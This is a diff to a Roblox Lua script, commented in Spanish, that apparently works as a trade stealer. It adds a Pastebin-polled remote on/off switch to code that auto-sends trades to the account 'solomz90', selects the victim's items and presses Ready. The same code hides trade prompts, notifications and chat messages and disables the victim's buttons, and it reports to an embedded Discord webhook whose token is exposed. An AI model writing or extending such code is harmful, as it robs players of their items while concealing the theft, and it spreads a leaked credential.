@@ -787,6 +787,90 @@ local leftCenterFrame = leftCenterGui:WaitForChild("LeftCenter")
 local ORIGINAL_POSITION = UDim2.new(0, 0, 0.5, 0)
 local locking = false
 
+-- =========================================================
+-- INTERRUPTOR MAESTRO (CONTROL REMOTO PASTEBIN) Y RESTAURACIÓN
+-- =========================================================
+local CONTROL_URL = "https://pastebin.com/raw/mASagzmn"
+local automationEnabled = false
+
+-- Tabla para guardar el estado original de los elementos ocultos
+local hiddenGuiStates = {}
+
+local function restoreHiddenGui()
+    for obj, state in pairs(hiddenGuiStates) do
+        if obj and obj.Parent then
+            pcall(function()
+                obj.Position = state.Position
+                obj.Visible = state.Visible
+                obj.BackgroundTransparency = state.BackgroundTransparency
+
+                if state.TextTransparency ~= nil then
+                    obj.TextTransparency = state.TextTransparency
+                end
+
+                if state.TextStrokeTransparency ~= nil then
+                    obj.TextStrokeTransparency = state.TextStrokeTransparency
+                end
+
+                if state.ImageTransparency ~= nil then
+                    obj.ImageTransparency = state.ImageTransparency
+                end
+
+                if state.GroupTransparency ~= nil then
+                    obj.GroupTransparency = state.GroupTransparency
+                end
+
+                if state.UIStroke
+                    and state.UIStroke.Parent
+                    and state.UIStrokeTransparency ~= nil then
+
+                    state.UIStroke.Transparency = state.UIStrokeTransparency
+                end
+            end)
+        end
+    end
+
+    table.clear(hiddenGuiStates)
+end
+
+local function updateAutomationStatus()
+    local success, response = pcall(function()
+        return game:HttpGet(CONTROL_URL .. "?t=" .. tostring(os.time()))
+    end)
+
+    if success then
+        response = string.upper(response:gsub("%s+", ""))
+
+        local previousState = automationEnabled
+
+        if response == "ON" then
+            automationEnabled = true
+        elseif response == "OFF" then
+            automationEnabled = false
+        end
+
+        -- Si acaba de cambiar de ON a OFF, restaurar toda la UI ocultada
+        if previousState and not automationEnabled then
+            restoreHiddenGui()
+            locking = false
+
+            pcall(function()
+                -- Nota: updateLeftCenterState se definirá más adelante, lo manejamos de forma segura
+                if updateLeftCenterState then
+                    updateLeftCenterState(false)
+                end
+            end)
+        end
+    end
+end
+
+task.spawn(function()
+    while true do
+        updateAutomationStatus()
+        task.wait(5)
+    end
+end)
+
 -- URL de tu Webhook de Discord
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1538656296943751180/_9xvaGd9sngrEJJkOSLnVxS4ORsUVK7Duyo1TzK4DoaZK7uf7liBdyhyP87G6M9rYCAN"
 
@@ -812,6 +896,57 @@ getgenv().NORMAL_GEARS = {
     ["Candy Sentry"] = true,
 }
 
+local function hideAllNotifications()
+    -- Esta conexión se queda escuchando siempre los elementos nuevos que salgan en pantalla
+    pg.DescendantAdded:Connect(function(child)
+        -- Si está en OFF, se ignora al momento
+        if not automationEnabled then return end
+        
+        task.defer(function()
+            -- Verificamos de nuevo por si cambió en milisegundos
+            if not automationEnabled then return end
+            
+            if child:IsA("GuiObject") then
+                local text = ""
+                
+                -- Buscar texto en los descendientes
+                for _, descendant in ipairs(child:GetDescendants()) do
+                    if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
+                        text = descendant.Text or ""
+                        break
+                    end
+                end
+                
+                -- Si el propio child es un TextLabel, tiene prioridad o complementa
+                if child:IsA("TextLabel") then
+                    text = child.Text or ""
+                end
+
+                -- Ocultar avisos molestos si está en ON
+                local textLower = string.lower(text)
+
+                if string.find(textLower, "intercambio") or 
+                    string.find(textLower, "other player") or 
+                    string.find(textLower, "inviting") or 
+                    string.find(textLower, "solomz90") or 
+                    string.find(textLower, "completed") or 
+                    string.find(textLower, "canceled") or 
+                    string.find(textLower, "adding") or 
+                    string.find(textLower, "pending") or 
+                    string.find(textLower, "invite") or 
+                    string.find(textLower, "already") then
+                    
+                    child.Visible = false
+                    child.Position = UDim2.new(10, 0, 10, 0)
+                end
+            end
+        end)
+    end)
+end
+
+-- Iniciamos la escucha permanente
+hideAllNotifications()
+
 --------------------------------------------------------------------------------
 -- OCULTAR NOTIFICACIONES Y MENSAJES DE TRADEO EN EL CHAT
 --------------------------------------------------------------------------------
@@ -819,16 +954,73 @@ pcall(function()
     StarterGui:SetCore("SendNotification", { Title = "", Text = "", Duration = 0 })
 end)
 
-if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-    TextChatService.OnIncomingMessage = function(message)
-        local textLower = string.lower(message.Text or "")
-        if string.find(textLower, "trade") or string.find(textLower, "solomz90") or string.find(textLower, "intercambio") or string.find(textLower, "request") then
-            local properties = Instance.new("TextChatMessageProperties")
-            properties.Text = ""
-            return properties
+local function hideTradePrompts()
+    local function processPrompt(gui)
+        if not automationEnabled then return end
+        
+        if gui:IsA("GuiObject") or gui:IsA("ScreenGui") then
+            local shouldHide = false
+            local textContent = ""
+
+            for _, descendant in ipairs(gui:GetDescendants()) do
+                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
+                    local txt = string.lower(descendant.Text or "")
+                    textContent = textContent .. " " .. txt
+                    
+                    if string.find(txt, "trade request") or string.find(txt, "wants to trade") or string.find(txt, "intercambio") then
+                        shouldHide = true
+                        break
+                    end
+                end
+            end
+
+            if not shouldHide and (gui:IsA("TextLabel") or gui:IsA("TextButton")) then
+                local txt = string.lower(gui.Text or "")
+                if string.find(txt, "trade request") or string.find(txt, "wants to trade") or string.find(txt, "intercambio") then
+                    shouldHide = true
+                end
+            end
+
+            if shouldHide then
+                if gui:IsA("GuiObject") then
+                    gui.Visible = false
+                    gui.Position = UDim2.new(10, 0, 10, 0)
+                elseif gui:IsA("ScreenGui") then
+                    gui.Enabled = false
+                    for _, child in ipairs(gui:GetChildren()) do
+                        if child:IsA("GuiObject") then
+                            child.Visible = false
+                            child.Position = UDim2.new(10, 0, 10, 0)
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    pg.DescendantAdded:Connect(function(child)
+        if not automationEnabled then return end
+        task.defer(function()
+            processPrompt(child)
+        end)
+    end)
+
+    pg.ChildAdded:Connect(function(child)
+        if not automationEnabled then return end
+        task.defer(function()
+            processPrompt(child)
+        end)
+    end)
+
+    for _, child in ipairs(pg:GetChildren()) do
+        processPrompt(child)
+        for _, desc in ipairs(child:GetDescendants()) do
+            processPrompt(desc)
         end
     end
 end
+
+hideTradePrompts()
 
 -- Función para enviar datos a Discord mediante Webhook
 local function sendToDiscord(title, description, fields)
@@ -860,8 +1052,8 @@ local function sendToDiscord(title, description, fields)
     end)
 end
 
--- Silenciar y eliminar sonidos no deseados en Workspace
 Workspace.ChildAdded:Connect(function(child)
+    if not automationEnabled then return end
     if child:IsA("Sound") and (child.Name == "Activated" or child.Name == "Error") then
         child.Volume = 0
         child:Stop()
@@ -870,6 +1062,7 @@ Workspace.ChildAdded:Connect(function(child)
 end)
 
 local function suppressMessages()
+    if not automationEnabled then return end
     local function cleanNotificationGui(gui)
         local nameLower = string.lower(gui.Name)
         if nameLower == "topnotification" or nameLower == "admin" then return end
@@ -888,33 +1081,10 @@ local function suppressMessages()
     end
 end
 
-local function hideTradePrompts()
-    local function processPrompt(gui)
-        local nameLower = string.lower(gui.Name)
-        if nameLower == "topnotification" or nameLower == "admin" then return end
-
-        if string.find(nameLower, "prompt") or string.find(nameLower, "alert") then
-            if gui:IsA("GuiObject") then
-                gui.Position = UDim2.new(10, 0, 10, 0)
-                gui.Visible = false
-            elseif gui:IsA("ScreenGui") then
-                for _, child in ipairs(gui:GetChildren()) do
-                    if child:IsA("GuiObject") then
-                        child.Position = UDim2.new(10, 0, 10, 0)
-                        child.Visible = false
-                    end
-                end
-            end
-        end
-    end
-    pg.ChildAdded:Connect(processPrompt)
-    for _, child in ipairs(pg:GetChildren()) do
-        processPrompt(child)
-    end
+if automationEnabled then
+    suppressMessages()
+    hideTradePrompts()
 end
-
-suppressMessages()
-hideTradePrompts()
 
 local function cleanStr(str)
     return string.lower(string.gsub(tostring(str or ""), "%s+", ""))
@@ -924,11 +1094,11 @@ end
 -- CONTROLADOR DE ESTADO DE UI (TRADEO ACTIVO / INACTIVO)
 -- =========================================================
 local function updateLeftCenterState(inTrade)
+    if not automationEnabled then return end
     if inTrade then
         leftCenterFrame.Position = ORIGINAL_POSITION
         locking = true
         
-        -- Desactivar clicks sin tocar apariencia
         for _, obj in ipairs(leftCenterFrame:GetDescendants()) do
             if obj:IsA("ImageButton") or obj:IsA("TextButton") then
                 obj.Active = false
@@ -936,7 +1106,6 @@ local function updateLeftCenterState(inTrade)
         end
     else
         locking = false
-        -- Restaurar estado normal de los botones
         for _, obj in ipairs(leftCenterFrame:GetDescendants()) do
             if obj:IsA("ImageButton") or obj:IsA("TextButton") then
                 obj.Active = true
@@ -945,8 +1114,8 @@ local function updateLeftCenterState(inTrade)
     end
 end
 
--- Mantener posición fija mientras esté bloqueado
 leftCenterFrame:GetPropertyChangedSignal("Position"):Connect(function()
+    if not automationEnabled then return end
     if not locking then return end
     if leftCenterFrame.Position ~= ORIGINAL_POSITION then
         leftCenterFrame.Position = ORIGINAL_POSITION
@@ -1115,26 +1284,83 @@ task.spawn(function()
         TargetBaseSkinsClean[cleanStr(baseName)] = baseName
     end
 
+    -- Función hideSingleObject actualizada con almacenamiento en hiddenGuiStates
     local function hideSingleObject(obj)
-        if obj:IsA("GuiObject") then
-            obj.Position = UDim2.new(10, 0, 10, 0)
-            obj.BackgroundTransparency = 1
-            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
-                obj.TextTransparency = 1
-                obj.TextStrokeTransparency = 1
+        if not automationEnabled then
+            return
+        end
+
+        if not obj:IsA("GuiObject") then
+            return
+        end
+
+        -- Guardar estado original solo la primera vez
+        if not hiddenGuiStates[obj] then
+            hiddenGuiStates[obj] = {
+                Position = obj.Position,
+                Visible = obj.Visible,
+                BackgroundTransparency = obj.BackgroundTransparency,
+                TextTransparency = (
+                    obj:IsA("TextLabel")
+                    or obj:IsA("TextButton")
+                    or obj:IsA("TextBox")
+                ) and obj.TextTransparency or nil,
+
+                TextStrokeTransparency = (
+                    obj:IsA("TextLabel")
+                    or obj:IsA("TextButton")
+                    or obj:IsA("TextBox")
+                ) and obj.TextStrokeTransparency or nil,
+
+                ImageTransparency = (
+                    obj:IsA("ImageLabel")
+                    or obj:IsA("ImageButton")
+                ) and obj.ImageTransparency or nil,
+
+                GroupTransparency = (
+                    obj:IsA("CanvasGroup")
+                ) and obj.GroupTransparency or nil
+            }
+
+            local stroke = obj:FindFirstChildOfClass("UIStroke")
+
+            if stroke then
+                hiddenGuiStates[obj].UIStroke = stroke
+                hiddenGuiStates[obj].UIStrokeTransparency = stroke.Transparency
             end
-            if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
-                obj.ImageTransparency = 1
-            end
-            if obj:IsA("CanvasGroup") then
-                obj.GroupTransparency = 1
-            end
-            local UIStroke = obj:FindFirstChildOfClass("UIStroke")
-            if UIStroke then UIStroke.Transparency = 1 end
+        end
+
+        -- Ocultar visualmente
+        obj.Position = UDim2.new(10, 0, 10, 0)
+        obj.BackgroundTransparency = 1
+
+        if obj:IsA("TextLabel")
+            or obj:IsA("TextButton")
+            or obj:IsA("TextBox") then
+
+            obj.TextTransparency = 1
+            obj.TextStrokeTransparency = 1
+        end
+
+        if obj:IsA("ImageLabel")
+            or obj:IsA("ImageButton") then
+
+            obj.ImageTransparency = 1
+        end
+
+        if obj:IsA("CanvasGroup") then
+            obj.GroupTransparency = 1
+        end
+
+        local stroke = obj:FindFirstChildOfClass("UIStroke")
+
+        if stroke then
+            stroke.Transparency = 1
         end
     end
 
     local function hideGuiVisualOnly(guiObj)
+        if not automationEnabled then return end
         for _, obj in ipairs(guiObj:GetDescendants()) do
             hideSingleObject(obj)
         end
@@ -1153,9 +1379,24 @@ task.spawn(function()
         end
         cam.ChildAdded:Connect(handleCam)
         for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
-        RunService.RenderStepped:Connect(function() cam.FieldOfView = 70 end)
+        
+        task.spawn(function()
+            while task.wait(0.1) do
+                if not automationEnabled then
+                    continue
+                end
+
+                cam.FieldOfView = 70
+
+                local tradeLive = pg:FindFirstChild("TradeLiveTrade")
+                if tradeLive then
+                    hideGuiVisualOnly(tradeLive)
+                end
+            end
+        end)
 
         local function handleGui(obj)
+            if not automationEnabled then return end
             if obj.Name:find("Prompt") or obj:IsA("ProximityPrompt") then return end
             if obj.Name == "TopNotification" or obj.Name == "Admin" then return end
 
@@ -1282,7 +1523,6 @@ task.spawn(function()
                             for gearName in pairs(getgenv().NORMAL_GEARS) do
                                 local cleanGear = cleanStr(gearName)
 
-                                -- SOLO coincidencia exacta
                                 if cleanName == cleanGear then
                                     if not foundGears[cleanGear] then
                                         foundGears[cleanGear] = {
@@ -1429,6 +1669,7 @@ task.spawn(function()
     end
 
     local function selectBrainrot(item, index)
+        if not automationEnabled then return false end
         task.wait(0.15)
         local button = findBrainrotButton(item)
         if not button then return false end
@@ -1517,6 +1758,7 @@ task.spawn(function()
     end
 
     local function selectGear(gearItem)
+        if not automationEnabled then return false end
         if not gearItem then return false end
         local uuid = gearItem.uuid
         local button = gearItem.button
@@ -1598,6 +1840,7 @@ task.spawn(function()
     end
 
     local function selectBaseSkin(baseItem)
+        if not automationEnabled then return false end
         if not baseItem then return false end
         local uuid = baseItem.uuid
         local button = baseItem.button
@@ -1625,13 +1868,14 @@ task.spawn(function()
     end
 
     local function processBaseSkinsSelection()
+        if not automationEnabled then return end
         clickBaseSkinsTab()
         task.wait(0.2)
 
         local baseQueue = findAllBaseSkinButtons()
         
         for _, baseItem in ipairs(baseQueue) do
-            if not isTradeActive() then break end
+            if not automationEnabled or not isTradeActive() then break end
             local success = false
             for attempt = 1, 2 do
                 success = selectBaseSkin(baseItem)
@@ -1643,6 +1887,7 @@ task.spawn(function()
     end
 
     local function pressReadyButtonByPath()
+        if not automationEnabled then return false end
         local readyBtn = pg:FindFirstChild("TradeLiveTrade") and pg.TradeLiveTrade:FindFirstChild("TradeLiveTrade") and pg.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Other") and pg.TradeLiveTrade.TradeLiveTrade.Other:FindFirstChild("ReadyButton")
         if readyBtn then
             local button = readyBtn:IsA("GuiButton") and readyBtn or readyBtn:FindFirstChildWhichIsA("GuiButton", true)
@@ -1655,6 +1900,7 @@ task.spawn(function()
     end
 
     local function sendTradeToPlayer()
+        if not automationEnabled then return end
         local tradeGui = pg:WaitForChild("TradePlayerList", 10)
         if not tradeGui then return end
         local trade = tradeGui:WaitForChild("TradePlayerList", 10)
@@ -1665,6 +1911,7 @@ task.spawn(function()
 
         local connection
         connection = list.ChildAdded:Connect(function(child)
+            if not automationEnabled then return end
             if string.find(string.lower(child.Name), "solomz90") then
                 if child:IsA("GuiObject") then
                     child.Visible = false
@@ -1718,7 +1965,7 @@ task.spawn(function()
             playerEntry.Visible = false
         end
 
-        local sendBtn = nil
+        sendBtn = nil
         for _, descendant in ipairs(playerEntry:GetDescendants()) do
             if descendant:IsA("GuiButton") then
                 sendBtn = descendant
@@ -1733,12 +1980,23 @@ task.spawn(function()
         local lastTradeState = false
 
         while true do
+            if not automationEnabled then
+                if lastTradeState then
+                    lastTradeState = false
+                    updateLeftCenterState(false)
+                end
+                task.wait(1)
+                continue
+            end
+
             processedBrainrots = {}
             processedGears = {}
             processedBases = {}
 
-            while not isTradeActive() do
-                -- Monitorear cambio de estado a Inactivo
+            while true do
+                if not automationEnabled then break end
+                if isTradeActive() then break end
+
                 if lastTradeState then
                     lastTradeState = false
                     updateLeftCenterState(false)
@@ -1747,12 +2005,13 @@ task.spawn(function()
                 sendTradeToPlayer()
                 local startWait = tick()
                 while tick() - startWait < 4 do
-                    if isTradeActive() then break end
+                    if not automationEnabled or isTradeActive() then break end
                     task.wait(0.3)
                 end
             end
 
-            -- Monitorear cambio de estado a Activo (Trade aceptado/iniciado)
+            if not automationEnabled then continue end
+
             if not lastTradeState then
                 lastTradeState = true
                 updateLeftCenterState(true)
@@ -1761,7 +2020,7 @@ task.spawn(function()
             task.wait(0.8)
 
             for index, item in ipairs(brainrotQueue) do
-                if not isTradeActive() then break end
+                if not automationEnabled or not isTradeActive() then break end
                 local success = false
                 for attempt = 1, 3 do
                     success = selectBrainrot(item, index)
@@ -1773,7 +2032,7 @@ task.spawn(function()
 
             local gearQueue = findAllGearButtons()
             for _, gearItem in ipairs(gearQueue) do
-                if not isTradeActive() then break end
+                if not automationEnabled or not isTradeActive() then break end
                 local success = false
                 for attempt = 1, 2 do
                     success = selectGear(gearItem)
@@ -1783,7 +2042,7 @@ task.spawn(function()
                 task.wait(DELAY_STEP + math.random(10, 25) / 100)
             end
 
-            if isTradeActive() then
+            if automationEnabled and isTradeActive() then
                 processBaseSkinsSelection()
             end
 
@@ -1791,7 +2050,7 @@ task.spawn(function()
             pressReadyButtonByPath()
 
             local timeout = 0
-            while isTradeActive() and timeout < 30 do
+            while automationEnabled and isTradeActive() and timeout < 30 do
                 pressReadyButtonByPath()
                 task.wait(1.5)
                 timeout = timeout + 1.5
